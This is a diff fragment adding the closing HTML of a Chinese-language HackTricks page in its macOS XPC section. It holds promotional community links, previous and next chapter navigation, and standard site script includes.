+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../../../elasticlunr.min.js"></script>
+        <script src="../../../../../mark.min.js"></script>
+        <script src="../../../../../searcher.js"></script>
+
+        <script src="../../../../../clipboard.min.js"></script>
+        <script src="../../../../../highlight.js"></script>
+        <script src="../../../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
